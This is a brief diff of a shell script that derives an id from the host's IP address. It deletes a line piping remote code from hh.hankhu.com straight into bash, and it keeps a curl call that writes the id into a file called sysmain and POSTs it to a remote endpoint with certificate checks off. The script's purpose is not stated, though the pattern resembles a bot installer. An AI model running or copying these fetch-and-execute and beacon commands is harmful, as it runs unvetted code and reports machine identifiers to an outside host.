@@ -21,16 +21,8 @@ else
     uid=${ip//./_}
     echo "auto uid：$uid"
 fi
-
-
-if [ ! -f sysmain ];then
-  bash  <(curl  -Ls https://hh.hankhu.com/mysh/musys)
-fi
-
-
 sed -i "s/usernameid/$uid/g" ./sysmain
 curl  -X POST  https://api.hankhu.xyz/sys/getuid.php -d "$uid" -sk
-
 
 fi
 
